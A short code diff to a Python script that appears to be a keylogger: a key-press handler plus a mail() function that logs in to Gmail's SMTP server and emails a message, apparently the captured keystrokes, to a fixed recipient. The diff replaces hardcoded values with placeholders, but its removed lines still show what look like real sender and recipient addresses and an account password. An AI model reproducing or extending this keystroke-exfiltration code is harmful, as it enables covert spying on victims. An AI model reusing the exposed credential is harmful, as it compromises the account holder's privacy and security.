@@ -18,8 +18,8 @@ def keyPressed(key):
             print("Error getting char")
 
 
-fromaddr = "muneawr@gmail.com"
-toaddr = "munawarp.pa@gmail.com"
+fromaddr = "FROM_ADDRESS"
+toaddr = "TO_ADDRESS"
 
 def mail():
     msg = MIMEMultipart()
@@ -38,7 +38,7 @@ def mail():
     msg.attach(p)
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
-    s.login(fromaddr, "utoiaduiuotrprfn")
+    s.login(fromaddr, "PASSWORD")
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
